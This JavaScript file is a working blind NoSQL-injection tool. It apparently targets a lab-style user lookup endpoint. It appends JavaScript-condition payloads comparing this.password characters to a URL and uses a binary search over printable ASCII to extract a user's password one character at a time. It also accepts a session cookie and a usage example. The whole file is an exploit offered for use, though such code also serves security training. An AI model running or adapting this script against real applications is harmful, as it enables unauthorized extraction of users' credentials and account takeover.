import axios from 'axios';

let argv = process.argv.slice(2);
let URL = argv[0];
let cookies, errorMessage;
for (let i = 1; i < argv.length; i++) {
    if (argv[i].includes("--cookie")) {
        cookies = argv[i].split(":")[1];
    }
    else if (argv[i].includes("--error"))
        errorMessage = argv[i].split(":")[1];
}
// console.log(argv.values);
// let cookies = argv[argv.findIndex("--cookie")].split(':');
// let errorMessage = argv[argv.findIndex("--error")].split(':');
let i = 0;



//In this wordlist, are the printable ASCII characters for the Binary Search.
var wordlist = ["!", '"', "#", "$", "%", "&", "'", "(", ")", "*", "+", ",", "-", ".", "/", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", ":", ";", "<", "=", ">", "?", "@", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "[", "\\", "]", "^", "_", "`", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "{", "|", "}", "~"]
let password = "";


if (URL == undefined) {
    console.log("You must specify a URL as a target");
    console.log("If you need to use a cookie, you can specify with the --cookie option");
    console.log("   --cookie: Specify a cookie if necesary");
    console.log("   --error: Specify the error message");


    console.log("For example: node App.js https://yourtarget.com/user/lookup?user=wiener --cookie:session=t1PLOAhrwAc6smr0CWErteKO1mI51aRb --error:\"Could not find user\"");
} else {
    
    console.log("Trying to exploit, please wait... ")
    exploit(0, wordlist, 0, wordlist.length - 1)
}


async function exploit(indexPassword = 0, wordlist, start = 0, end = wordlist.length - 1) {
    if (start > end) return false;
    let mid = Math.floor((start + end) / 2)
    try {
        const tempURLEqual = URL + `'+%26%26+this.password[${indexPassword}]+==+'${wordlist[mid]}'+||+'a'=='b`;
        const tempURLGreater = URL + `'+%26%26+this.password[${indexPassword}]+>+'${wordlist[mid]}'+||+'a'=='b`;
        const resEqual = await axios.get(tempURLEqual, {
            headers: {
                Cookie: cookies
            }
        })
        if (!resEqual.data.message) {
            console.log(`Character ${wordlist[mid]} found in position ${indexPassword}`)
            password += wordlist[mid];
            console.log(`Password until now: ${password}`)
            const validatePassword = URL + `'+%26%26+this.password+==+'${password}'+||+'a'=='b`
            const resGreater = await axios.get(validatePassword, {
                headers: {
                    Cookie: cookies
                }
            })
            if (!resGreater.data.message) {
                console.log("\n")
                console.log(`Final password found: ${password}`);
                return true;
            } else {
                exploit(indexPassword + 1, wordlist)
            }

        };

        const resGreater = await axios.get(tempURLGreater, {
            headers: {
                Cookie: cookies
            }
        })
        let errorGreater = resGreater.data.message

        if (errorGreater) {
            exploit(indexPassword, wordlist, start, mid - 1)
        } else {
            exploit(indexPassword, wordlist, mid + 1, end)
        }

    } catch (e) {
        console.log(e)
    }
}
